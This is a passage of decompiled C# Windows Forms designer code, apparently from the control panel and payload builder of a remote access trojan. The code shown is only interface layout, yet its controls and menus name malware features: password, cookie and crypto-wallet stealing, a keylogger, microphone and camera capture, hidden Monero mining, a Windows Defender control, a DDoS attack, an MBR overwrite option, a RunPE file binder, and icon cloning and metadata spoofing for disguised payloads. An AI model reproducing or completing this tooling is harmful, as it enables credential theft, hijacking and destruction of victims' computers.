		ToolStripMenuItem27 = new ToolStripMenuItem();
		ToolStripMenuItem28 = new ToolStripMenuItem();
		PictureBox61 = new PictureBox();
		Label74 = new Label();
		Guna2GradientButton1 = new Guna2GradientButton();
		List_Kill = new Guna2TextBox();
		TabPage6 = new TabPage();
		Panel32 = new Panel();
		Panel36 = new Panel();
		PictureBox73 = new PictureBox();
		Proxy_Port = new Guna2TextBox();
		Enable_Proxy = new Guna2ToggleSwitch();
		Label78 = new Label();
		Proxy_Host = new Guna2TextBox();
		PictureBox72 = new PictureBox();
		NVIDIA = new Guna2ToggleSwitch();
		Label83 = new Label();
		PictureBox74 = new PictureBox();
		CPU = new Guna2ToggleSwitch();
		Label86 = new Label();
		PictureBox75 = new PictureBox();
		Label89 = new Label();
		AMD = new Guna2ToggleSwitch();
		XMR = new Guna2ToggleSwitch();
		Label87 = new Label();
		Wallet_address = new Guna2TextBox();
		PictureBox65 = new PictureBox();
		POOL = new Guna2TextBox();
		Guna2GradientPanel11 = new Guna2GradientPanel();
		NEC = new Guna2TextBox();
		XLM = new Guna2TextBox();
		XRP = new Guna2TextBox();
		LTC = new Guna2TextBox();
		PictureBox70 = new PictureBox();
		ETH = new Guna2TextBox();
		GXMR = new Guna2TextBox();
		Label85 = new Label();
		BTC = new Guna2TextBox();
		Grabber = new Guna2ToggleSwitch();
		TabPage8 = new TabPage();
		Panel31 = new Panel();
		Guna2GradientPanel8 = new Guna2GradientPanel();
		Binder_ComboBox1 = new Guna2ComboBox();
		PictureBox76 = new PictureBox();
		Binder_Run = new Guna2ToggleSwitch();
		Label82 = new Label();
		Loading = new RadioButton();
		RunPE = new RadioButton();
		PictureBox71 = new PictureBox();
		Label81 = new Label();
		Binder_Path = new Guna2TextBox();
		Enable_Binder = new Guna2ToggleSwitch();
		TabPage9 = new TabPage();
		Panel34 = new Panel();
		Guna2GradientPanel13 = new Guna2GradientPanel();
		Path_icon = new Guna2TextBox();
		PictureBox_icon = new PictureBox();
		Add_icon = new Guna2GradientButton();
		Label84 = new Label();
		Enable_icon = new Guna2ToggleSwitch();
		Guna2GradientPanel12 = new Guna2GradientPanel();
		num4 = new NumericUpDown();
		num3 = new NumericUpDown();
		Label41 = new Label();
		num2 = new NumericUpDown();
		num1 = new NumericUpDown();
		GeRan = new Guna2GradientButton();
		Clone_F = new Guna2GradientButton();
		As5 = new Guna2TextBox();
		As4 = new Guna2TextBox();
		As3 = new Guna2TextBox();
		As2 = new Guna2TextBox();
		Label88 = new Label();
		As1 = new Guna2TextBox();
		Guna2ToggleSwitch2 = new Guna2ToggleSwitch();
		TabPage3 = new TabPage();
		Panel24 = new Panel();
		Panel30 = new Panel();
		PictureBox79 = new PictureBox();
		PictureBox26 = new PictureBox();
		Label59 = new Label();
		MPASSZ = new Guna2ToggleSwitch();
		Label40 = new Label();
		Cookies = new Guna2ToggleSwitch();
		Panel29 = new Panel();
		TXT_SPOOFING = new Guna2TextBox();
		PictureBox77 = new PictureBox();
		Label92 = new Label();
		SPOFFING = new Guna2ToggleSwitch();
		Panel28 = new Panel();
		PictureBox31 = new PictureBox();
		Label91 = new Label();
		MBRBZ = new Guna2ToggleSwitch();
		PictureBox78 = new PictureBox();
		MMinings = new Guna2ToggleSwitch();
		Label56 = new Label();
		Panel39 = new Panel();
		NETFRAMWORKS = new Guna2ComboBox();
		Label90 = new Label();
		Panel38 = new Panel();
		PictureBox83 = new PictureBox();
		CMD = new Guna2RadioButton();
		PictureBox84 = new PictureBox();
		BAT = new Guna2RadioButton();
		PictureBox85 = new PictureBox();
		PIF = new Guna2RadioButton();
		PictureBox82 = new PictureBox();
		COM = new Guna2RadioButton();
		PictureBox81 = new PictureBox();
		SCR = new Guna2RadioButton();
		Label60 = new Label();
		PictureBox80 = new PictureBox();
		EXE = new Guna2RadioButton();
		Panel37 = new Panel();
		Guna2ComboBox1 = new Guna2ComboBox();
		PictureBox28 = new PictureBox();
		Label44 = new Label();
		Encrypt = new Guna2ToggleSwitch();
		Panel35 = new Panel();
		Nu = new NumericUpDown();
		KB = new Guna2RadioButton();
		ZIS = new Guna2ToggleSwitch();
		MB = new Guna2RadioButton();
		Label55 = new Label();
		GB = new Guna2RadioButton();
		Label6 = new Label();
		Building = new Guna2Button();
		D = new TabPage();
		ListView2 = new ListView();
		vmethod_73(new ColumnHeader());
		vmethod_74(new ColumnHeader());
		vmethod_76(new ColumnHeader());
		vmethod_78(new ColumnHeader());
		vmethod_63(new ImageList(icontainer_0));
		Panel33 = new Panel();
		USS = new Guna2CircleProgressBar();
		Label12 = new Label();
		Panel21 = new Panel();
		Win10 = new Guna2Button();
		PictureBox8 = new PictureBox();
		Label27 = new Label();
		Panel22 = new Panel();
		Win8 = new Guna2Button();
		PictureBox13 = new PictureBox();
		Label28 = new Label();
		Panel15 = new Panel();
		Win7 = new Guna2Button();
		PictureBox5 = new PictureBox();
		Label25 = new Label();
		Panel20 = new Panel();
		Winxp = new Guna2Button();
		PictureBox12 = new PictureBox();
		Label31 = new Label();
		Panel14 = new Panel();
		Panel12 = new Panel();
		Guna2Button7 = new Guna2Button();
		Label19 = new Label();
		PictureBox16 = new PictureBox();
		Panel10 = new Panel();
		SCANN = new Guna2Button();
		Label11 = new Label();
		PictureBox14 = new PictureBox();
		Label23 = new Label();
		Guna2CircleProgressBar1 = new Guna2CircleProgressBar();
		PictureBox6 = new PictureBox();
		ListView1 = new ListView();
		vmethod_19(new ColumnHeader());
		vmethod_65(new ColumnHeader());
		vmethod_67(new ColumnHeader());
		vmethod_69(new ColumnHeader());
		Passwords = new TabPage();
		Guna2GradientPanel14 = new Guna2GradientPanel();
		Panel40 = new Panel();
		Panel41 = new Panel();
		Scan_pass = new Guna2Button();
		Label17 = new Label();
		PictureBox86 = new PictureBox();
		Panel42 = new Panel();
		Pass_len = new Guna2Button();
		Label93 = new Label();
		PictureBox87 = new PictureBox();
		Label94 = new Label();
		Guna2CircleProgressBar2 = new Guna2CircleProgressBar();
		PictureBox88 = new PictureBox();
		List_pass = new ListView();
		vmethod_94(new ColumnHeader());
		vmethod_96(new ColumnHeader());
		vmethod_98(new ColumnHeader());
		vmethod_100(new ContextMenuStrip(icontainer_0));
		ToolStripMenuItem29 = new ToolStripMenuItem();
		vmethod_17(new ImageList(icontainer_0));
		Miner = new TabPage();
		Guna2GradientPanel15 = new Guna2GradientPanel();
		Panel43 = new Panel();
		Panel44 = new Panel();
		Mining_Scan = new Guna2Button();
		Label95 = new Label();
		PictureBox89 = new PictureBox();
		Panel45 = new Panel();
		Mining_len = new Guna2Button();
		Label96 = new Label();
		PictureBox90 = new PictureBox();
		Label97 = new Label();
		Guna2CircleProgressBar3 = new Guna2CircleProgressBar();
		PictureBox91 = new PictureBox();
		L1_Miner = new ListView();
		vmethod_102(new ColumnHeader());
		vmethod_104(new ColumnHeader());
		vmethod_106(new ColumnHeader());
		vmethod_108(new ColumnHeader());
		vmethod_110(new ColumnHeader());
		vmethod_112(new ColumnHeader());
		Grabberff = new TabPage();
		Guna2GradientPanel16 = new Guna2GradientPanel();
		Panel46 = new Panel();
		Panel47 = new Panel();
		Grabber_Scan = new Guna2Button();
		Label98 = new Label();
		PictureBox92 = new PictureBox();
		Panel48 = new Panel();
		Grabber_len = new Guna2Button();
		Label99 = new Label();
		PictureBox93 = new PictureBox();
		Label100 = new Label();
		Guna2CircleProgressBar4 = new Guna2CircleProgressBar();
		PictureBox94 = new PictureBox();
		L1_Grabber = new ListView();
		vmethod_114(new ColumnHeader());
		vmethod_116(new ColumnHeader());
		vmethod_118(new ColumnHeader());
		vmethod_120(new ColumnHeader());
		Logs = new TabPage();
		Guna2GradientPanel17 = new Guna2GradientPanel();
		Panel49 = new Panel();
		Panel50 = new Panel();
		Cookies_scan = new Guna2Button();
		Label101 = new Label();
		PictureBox95 = new PictureBox();
		Panel51 = new Panel();
		Cookies_len = new Guna2Button();
		Label102 = new Label();
		PictureBox96 = new PictureBox();
		Label103 = new Label();
		Guna2CircleProgressBar5 = new Guna2CircleProgressBar();
		PictureBox97 = new PictureBox();
		Logisx = new ListView();
		vmethod_122(new ColumnHeader());
		vmethod_124(new ColumnHeader());
		vmethod_126(new ColumnHeader());
		vmethod_132(new ColumnHeader());
		vmethod_128(new ContextMenuStrip(icontainer_0));
		ToolStripMenuItem30 = new ToolStripMenuItem();
		Settings = new TabPage();
		Guna2GradientButton2 = new Guna2GradientButton();
		Panel27 = new Panel();
		PictureBox25 = new PictureBox();
		scrI = new Guna2ComboBox();
		Label39 = new Label();
		Panel26 = new Panel();
		ShowAlert = new Guna2CheckBox();
		LOGLERR = new Guna2CheckBox();
		LOGMSGS = new Guna2CheckBox();
		LOGRERR = new Guna2CheckBox();
		LOGCONNECTIONS = new Guna2CheckBox();
		LOGLOGIN = new Guna2CheckBox();
		PictureBox18 = new PictureBox();
		Label38 = new Label();
		Panel25 = new Panel();
		MICAUT = new Guna2CheckBox();
		PictureBox4 = new PictureBox();
		MICI = new Guna2ComboBox();
		Label36 = new Label();
		Panel5 = new Panel();
		CAMAUT = new Guna2CheckBox();
		PictureBox3 = new PictureBox();
		CAMI = new Guna2ComboBox();
		Label35 = new Label();
		Panel3 = new Panel();
		SCAUT = new Guna2CheckBox();
		PictureBox2 = new PictureBox();
		SCI = new Guna2ComboBox();
		Label34 = new Label();
		Abouts = new TabPage();
		Button12 = new Button();
		Button11 = new Button();
		PictureBox98 = new PictureBox();
		Panel7 = new Panel();
		panel1 = new Panel();
		pnlNav = new Panel();
		NOTF_COK = new Guna2Button();
		NOTF_BRBS1 = new Guna2Button();
		NOTF_L1_Miner = new Guna2Button();
		Notf_pass = new Guna2Button();
		Button10 = new Button();
		Button9 = new Button();
		Button8 = new Button();
		NONN = new Guna2Button();
		Settings6 = new Button();
		Toolbox5 = new Button();
		About = new Button();
		Logis4 = new Button();
		Builder3 = new Button();
		Client2 = new Button();
		Home1 = new Button();
		panel2 = new Panel();
		Label8 = new Label();
		pictureBox1 = new PictureBox();
		vmethod_21(new ColumnHeader());
		vmethod_23(new ColumnHeader());
		vmethod_25(new ColumnHeader());
		vmethod_27(new ColumnHeader());
		vmethod_29(new ColumnHeader());
		vmethod_31(new ColumnHeader());
		vmethod_33(new ColumnHeader());
		vmethod_34(new ColumnHeader());
		vmethod_36(new ColumnHeader());
		vmethod_38(new ColumnHeader());
		vmethod_40(new ColumnHeader());
		vmethod_42(new ColumnHeader());
		vmethod_44(new ColumnHeader());
		yocrwWjOaxM(new ColumnHeader());
		vmethod_47(new ColumnHeader());
		vmethod_49(new ColumnHeader());
		vmethod_51(new ColumnHeader());
		vmethod_53(new ColumnHeader());
		vmethod_55(new ColumnHeader());
		vmethod_57(new ColumnHeader());
		vmethod_59(new ColumnHeader());
		vmethod_61(new ColumnHeader());
		Control = new Guna2ContextMenuStrip();
		MyComputerToolStripMenuItem = new ToolStripMenuItem();
		ManagerToolStripMenuItem1 = new ToolStripMenuItem();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		vmethod_71(new System.Windows.Forms.Timer(icontainer_0));
		vmethod_80(new ImageList(icontainer_0));
		vmethod_82(new System.Windows.Forms.Timer(icontainer_0));
		Guna2DragControl1 = new Guna2DragControl(icontainer_0);
		vmethod_90(new Guna2AnimateWindow(icontainer_0));
		vmethod_130(new SaveFileDialog());
		Box1 = new RichTextBox();
		Box2 = new RichTextBox();
		vmethod_134(new System.Windows.Forms.Timer(icontainer_0));
		vmethod_136(new System.Windows.Forms.Timer(icontainer_0));
		RichTextBox1 = new RichTextBox();
		RichTextBox2 = new RichTextBox();
		vmethod_7(new Guna2Elipse(icontainer_0));
		ContextMenuStrip1.SuspendLayout();
		ContextMenuStrip2.SuspendLayout();
		P1.SuspendLayout();
		Panel6.SuspendLayout();
		((ISupportInitialize)Pp1).BeginInit();
		panel9.SuspendLayout();
		panel8.SuspendLayout();
		((ISupportInitialize)PictureBox20).BeginInit();
		((ISupportInitialize)PictureBox21).BeginInit();
		((ISupportInitialize)PictureBox22).BeginInit();
		((ISupportInitialize)PictureBox19).BeginInit();
		panel4.SuspendLayout();
		TabControl1.SuspendLayout();
		A.SuspendLayout();
		B.SuspendLayout();
		Panel19.SuspendLayout();
		((ISupportInitialize)PictureBox11).BeginInit();
		Panel18.SuspendLayout();
		((ISupportInitialize)PictureBox10).BeginInit();
		Panel17.SuspendLayout();
		((ISupportInitialize)PictureBox9).BeginInit();
		Panel16.SuspendLayout();
		((ISupportInitialize)PictureBox7).BeginInit();
		((ISupportInitialize)L1).BeginInit();
		C.SuspendLayout();
		Guna2GradientPanel4.SuspendLayout();
		TabControl2.SuspendLayout();
		Connect1.SuspendLayout();
		CCC.SuspendLayout();
		Guna2GradientPanel5.SuspendLayout();
		Remove_List_Connection.SuspendLayout();
		((ISupportInitialize)PictureBox33).BeginInit();
		Guna2GradientPanel7.SuspendLayout();
		((ISupportInitialize)PictureBox23).BeginInit();
		((ISupportInitialize)PictureBox30).BeginInit();
		((ISupportInitialize)PictureBox32).BeginInit();
		((ISupportInitialize)PictureBox34).BeginInit();
		((ISupportInitialize)PictureBox15).BeginInit();
		((ISupportInitialize)PictureBox35).BeginInit();
		((ISupportInitialize)PictureBox37).BeginInit();
		Install1.SuspendLayout();
		Panel13.SuspendLayout();
		Panel11.SuspendLayout();
		((ISupportInitialize)PictureBox51).BeginInit();
		((ISupportInitialize)PictureBox50).BeginInit();
		((ISupportInitialize)PictureBox49).BeginInit();
		Guna2GradientPanel9.SuspendLayout();
		((ISupportInitialize)PictureBox60).BeginInit();
		((ISupportInitialize)PictureBox48).BeginInit();
		((ISupportInitialize)PictureBox44).BeginInit();
		((ISupportInitialize)PictureBox59).BeginInit();
		((ISupportInitialize)PictureBox47).BeginInit();
		((ISupportInitialize)PictureBox45).BeginInit();
		((ISupportInitialize)PictureBox46).BeginInit();
		((ISupportInitialize)PictureBox57).BeginInit();
		((ISupportInitialize)PictureBox58).BeginInit();
		Guna2GradientPanel6.SuspendLayout();
		((ISupportInitialize)PictureBox56).BeginInit();
		((ISupportInitialize)PictureBox43).BeginInit();
		((ISupportInitialize)PictureBox24).BeginInit();
		((ISupportInitialize)PictureBox38).BeginInit();
		((ISupportInitialize)PictureBox40).BeginInit();
		((ISupportInitialize)PictureBox41).BeginInit();
		((ISupportInitialize)PictureBox54).BeginInit();
		((ISupportInitialize)PictureBox55).BeginInit();
		((ISupportInitialize)PictureBox53).BeginInit();
		((ISupportInitialize)PictureBox52).BeginInit();
		((ISupportInitialize)PictureBox42).BeginInit();
		((ISupportInitialize)PictureBox39).BeginInit();
		((ISupportInitialize)PictureBox36).BeginInit();
		((ISupportInitialize)PictureBox29).BeginInit();
		Security1.SuspendLayout();
		Panel23.SuspendLayout();
		Guna2GradientPanel10.SuspendLayout();
		((ISupportInitialize)PictureBox69).BeginInit();
		((ISupportInitialize)PictureBox17).BeginInit();
		((ISupportInitialize)PictureBox68).BeginInit();
		((ISupportInitialize)PictureBox62).BeginInit();
		((ISupportInitialize)PictureBox63).BeginInit();
		((ISupportInitialize)PictureBox64).BeginInit();
		((ISupportInitialize)PictureBox66).BeginInit();
		((ISupportInitialize)PictureBox67).BeginInit();
		Tab_Process.SuspendLayout();
		Remove_List_Kill.SuspendLayout();
		((ISupportInitialize)PictureBox61).BeginInit();
		TabPage6.SuspendLayout();
		Panel32.SuspendLayout();
		Panel36.SuspendLayout();
		((ISupportInitialize)PictureBox73).BeginInit();
		((ISupportInitialize)PictureBox72).BeginInit();
		((ISupportInitialize)PictureBox74).BeginInit();
		((ISupportInitialize)PictureBox75).BeginInit();
		((ISupportInitialize)PictureBox65).BeginInit();
		Guna2GradientPanel11.SuspendLayout();
		((ISupportInitialize)PictureBox70).BeginInit();
		TabPage8.SuspendLayout();
		Panel31.SuspendLayout();
		Guna2GradientPanel8.SuspendLayout();
		((ISupportInitialize)PictureBox76).BeginInit();
		((ISupportInitialize)PictureBox71).BeginInit();
		TabPage9.SuspendLayout();
		Panel34.SuspendLayout();
		Guna2GradientPanel13.SuspendLayout();
		((ISupportInitialize)PictureBox_icon).BeginInit();
		Guna2GradientPanel12.SuspendLayout();
		((ISupportInitialize)num4).BeginInit();
		((ISupportInitialize)num3).BeginInit();
		((ISupportInitialize)num2).BeginInit();
		((ISupportInitialize)num1).BeginInit();
		TabPage3.SuspendLayout();
		Panel24.SuspendLayout();
		Panel30.SuspendLayout();
		((ISupportInitialize)PictureBox79).BeginInit();
		((ISupportInitialize)PictureBox26).BeginInit();
		Panel29.SuspendLayout();
		((ISupportInitialize)PictureBox77).BeginInit();
		Panel28.SuspendLayout();
		((ISupportInitialize)PictureBox31).BeginInit();
		((ISupportInitialize)PictureBox78).BeginInit();
		Panel39.SuspendLayout();
		Panel38.SuspendLayout();
		((ISupportInitialize)PictureBox83).BeginInit();
		((ISupportInitialize)PictureBox84).BeginInit();
		((ISupportInitialize)PictureBox85).BeginInit();
		((ISupportInitialize)PictureBox82).BeginInit();
		((ISupportInitialize)PictureBox81).BeginInit();
		((ISupportInitialize)PictureBox80).BeginInit();
		Panel37.SuspendLayout();
		((ISupportInitialize)PictureBox28).BeginInit();
		Panel35.SuspendLayout();
		((ISupportInitialize)Nu).BeginInit();
		D.SuspendLayout();
		Panel33.SuspendLayout();
		Panel21.SuspendLayout();
		((ISupportInitialize)PictureBox8).BeginInit();
		Panel22.SuspendLayout();
		((ISupportInitialize)PictureBox13).BeginInit();
		Panel15.SuspendLayout();
		((ISupportInitialize)PictureBox5).BeginInit();
		Panel20.SuspendLayout();
		((ISupportInitialize)PictureBox12).BeginInit();
		Panel14.SuspendLayout();
		Panel12.SuspendLayout();
		((ISupportInitialize)PictureBox16).BeginInit();
		Panel10.SuspendLayout();
		((ISupportInitialize)PictureBox14).BeginInit();
		Guna2CircleProgressBar1.SuspendLayout();
		((ISupportInitialize)PictureBox6).BeginInit();
		Passwords.SuspendLayout();
		Guna2GradientPanel14.SuspendLayout();
		Panel40.SuspendLayout();
		Panel41.SuspendLayout();
		((ISupportInitialize)PictureBox86).BeginInit();
		Panel42.SuspendLayout();
		((ISupportInitialize)PictureBox87).BeginInit();
		Guna2CircleProgressBar2.SuspendLayout();
		((ISupportInitialize)PictureBox88).BeginInit();
		vmethod_99().SuspendLayout();
		Miner.SuspendLayout();
		Guna2GradientPanel15.SuspendLayout();
		Panel43.SuspendLayout();
		Panel44.SuspendLayout();
		((ISupportInitialize)PictureBox89).BeginInit();
		Panel45.SuspendLayout();
		((ISupportInitialize)PictureBox90).BeginInit();
		Guna2CircleProgressBar3.SuspendLayout();
		((ISupportInitialize)PictureBox91).BeginInit();
		Grabberff.SuspendLayout();
		Guna2GradientPanel16.SuspendLayout();
		Panel46.SuspendLayout();
		Panel47.SuspendLayout();
		((ISupportInitialize)PictureBox92).BeginInit();
		Panel48.SuspendLayout();
		((ISupportInitialize)PictureBox93).BeginInit();
		Guna2CircleProgressBar4.SuspendLayout();
		((ISupportInitialize)PictureBox94).BeginInit();
		Logs.SuspendLayout();
		Guna2GradientPanel17.SuspendLayout();
		Panel49.SuspendLayout();
		Panel50.SuspendLayout();
		((ISupportInitialize)PictureBox95).BeginInit();
		Panel51.SuspendLayout();
		((ISupportInitialize)PictureBox96).BeginInit();
		Guna2CircleProgressBar5.SuspendLayout();
		((ISupportInitialize)PictureBox97).BeginInit();
		vmethod_127().SuspendLayout();
		Settings.SuspendLayout();
		Panel27.SuspendLayout();
		((ISupportInitialize)PictureBox25).BeginInit();
		Panel26.SuspendLayout();
		((ISupportInitialize)PictureBox18).BeginInit();
		Panel25.SuspendLayout();
		((ISupportInitialize)PictureBox4).BeginInit();
		Panel5.SuspendLayout();
		((ISupportInitialize)PictureBox3).BeginInit();
		Panel3.SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		Abouts.SuspendLayout();
		((ISupportInitialize)PictureBox98).BeginInit();
		panel1.SuspendLayout();
		panel2.SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		Control.SuspendLayout();
		SuspendLayout();
		ContextMenuStrip1.BackColor = Color.Black;
		ContextMenuStrip1.Font = new Font("Segoe UI", 14.25f, FontStyle.Bold);
		ContextMenuStrip1.ImageScalingSize = new Size(32, 32);
		ContextMenuStrip1.ImeMode = ImeMode.Disable;
		ContextMenuStrip1.Items.AddRange(new ToolStripItem[14]
		{
			ManagerToolStripMenuItem, ToolStripMenuItem4, RunFileToolStripMenuItem, ToolStripMenuItem1, RemoteDesktopToolStripMenuItem, ToolStripMenuItem16, MicrophoneToolStripMenuItem, KeyloggerToolStripMenuItem, GetPasswordsToolStripMenuItem, ServerToolStripMenuItem,
			VirusToolStripMenuItem, NgrokToolStripMenuItem, OpenChatToolStripMenuItem, OpenFolderToolStripMenuItem
		});
		ContextMenuStrip1.LayoutStyle = ToolStripLayoutStyle.VerticalStackWithOverflow;
		ContextMenuStrip1.Name = "ContextMenuStrip1";
		ContextMenuStrip1.RenderMode = ToolStripRenderMode.Professional;
		ContextMenuStrip1.Size = new Size(224, 536);
		ManagerToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		ManagerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3] { ManagerToolStripMenuItem2, ControllToolStripMenuItem, InformationsToolStripMenuItem });
		ManagerToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ManagerToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		ManagerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ManagerToolStripMenuItem.Image");
		ManagerToolStripMenuItem.ImageTransparentColor = Color.FromArgb(0, 126, 249);
		ManagerToolStripMenuItem.Name = "ManagerToolStripMenuItem";
		ManagerToolStripMenuItem.Size = new Size(223, 38);
		ManagerToolStripMenuItem.Text = "PC";
		ManagerToolStripMenuItem2.BackColor = Color.FromArgb(24, 30, 54);
		ManagerToolStripMenuItem2.ForeColor = Color.White;
		ManagerToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("ManagerToolStripMenuItem2.Image");
		ManagerToolStripMenuItem2.Name = "ManagerToolStripMenuItem2";
		ManagerToolStripMenuItem2.Size = new Size(145, 22);
		ManagerToolStripMenuItem2.Text = "Manager";
		ControllToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		ControllToolStripMenuItem.ForeColor = Color.White;
		ControllToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ControllToolStripMenuItem.Image");
		ControllToolStripMenuItem.Name = "ControllToolStripMenuItem";
		ControllToolStripMenuItem.Size = new Size(145, 22);
		ControllToolStripMenuItem.Text = "Control";
		InformationsToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		InformationsToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		InformationsToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		InformationsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("InformationsToolStripMenuItem.Image");
		InformationsToolStripMenuItem.Name = "InformationsToolStripMenuItem";
		InformationsToolStripMenuItem.Size = new Size(145, 22);
		InformationsToolStripMenuItem.Text = "informations";
		ToolStripMenuItem4.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem4.DropDownItems.AddRange(new ToolStripItem[13]
		{
			ToolStripMenuItem23, ToolStripMenuItem5, ToolStripMenuItem6, ToolStripMenuItem7, ToolStripMenuItem8, ToolStripMenuItem9, ToolStripMenuItem2, ToolStripMenuItem18, ToolStripMenuItem14, FunToolStripMenuItem1,
			ToolStripMenuItem12, ToolStripMenuItem22, ToolStripMenuItem13
		});
		ToolStripMenuItem4.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem4.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem4.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem4.Image");
		ToolStripMenuItem4.Name = "ToolStripMenuItem4";
		ToolStripMenuItem4.Size = new Size(223, 38);
		ToolStripMenuItem4.Text = "Extra ";
		ToolStripMenuItem23.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem23.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem23.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem23.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem23.Image");
		ToolStripMenuItem23.Name = "ToolStripMenuItem23";
		ToolStripMenuItem23.Size = new Size(226, 22);
		ToolStripMenuItem23.Text = "Active Window";
		ToolStripMenuItem5.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem5.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem5.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem5.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem5.Image");
		ToolStripMenuItem5.Name = "ToolStripMenuItem5";
		ToolStripMenuItem5.Size = new Size(226, 22);
		ToolStripMenuItem5.Text = " XMR Mining";
		ToolStripMenuItem6.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem6.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem6.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem6.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem6.Image");
		ToolStripMenuItem6.Name = "ToolStripMenuItem6";
		ToolStripMenuItem6.Size = new Size(226, 22);
		ToolStripMenuItem6.Text = "Anti Process";
		ToolStripMenuItem7.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem7.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem7.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem7.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem7.Image");
		ToolStripMenuItem7.Name = "ToolStripMenuItem7";
		ToolStripMenuItem7.Size = new Size(226, 22);
		ToolStripMenuItem7.Text = "VB.NET Compiler";
		ToolStripMenuItem8.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem8.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem8.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem8.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem8.Image");
		ToolStripMenuItem8.Name = "ToolStripMenuItem8";
		ToolStripMenuItem8.Size = new Size(226, 22);
		ToolStripMenuItem8.Text = " Control Windows Defender";
		ToolStripMenuItem9.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem9.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem9.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem9.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem9.Image");
		ToolStripMenuItem9.Name = "ToolStripMenuItem9";
		ToolStripMenuItem9.Size = new Size(226, 22);
		ToolStripMenuItem9.Text = "Clipboard";
		ToolStripMenuItem2.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem2.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem2.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
		ToolStripMenuItem2.Name = "ToolStripMenuItem2";
		ToolStripMenuItem2.Size = new Size(226, 22);
		ToolStripMenuItem2.Text = "Screen lock";
		ToolStripMenuItem18.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem18.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem18.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem18.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem18.Image");
		ToolStripMenuItem18.Name = "ToolStripMenuItem18";
		ToolStripMenuItem18.Size = new Size(226, 22);
		ToolStripMenuItem18.Text = "Index";
		ToolStripMenuItem14.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem14.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem14.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem14.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem14.Image");
		ToolStripMenuItem14.Name = "ToolStripMenuItem14";
		ToolStripMenuItem14.Size = new Size(226, 22);
		ToolStripMenuItem14.Text = "DDos Attack";
		FunToolStripMenuItem1.BackColor = Color.FromArgb(24, 30, 54);
		FunToolStripMenuItem1.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		FunToolStripMenuItem1.ForeColor = Color.FromArgb(224, 224, 224);
		FunToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("FunToolStripMenuItem1.Image");
		FunToolStripMenuItem1.Name = "FunToolStripMenuItem1";
		FunToolStripMenuItem1.Size = new Size(226, 22);
		FunToolStripMenuItem1.Text = "PC Control";
		ToolStripMenuItem12.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem12.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem12.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem12.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem12.Image");
		ToolStripMenuItem12.Name = "ToolStripMenuItem12";
		ToolStripMenuItem12.Size = new Size(226, 22);
		ToolStripMenuItem12.Text = "Msgbox";
		ToolStripMenuItem22.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem22.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem22.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem22.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem22.Image");
		ToolStripMenuItem22.Name = "ToolStripMenuItem22";
		ToolStripMenuItem22.Size = new Size(226, 22);
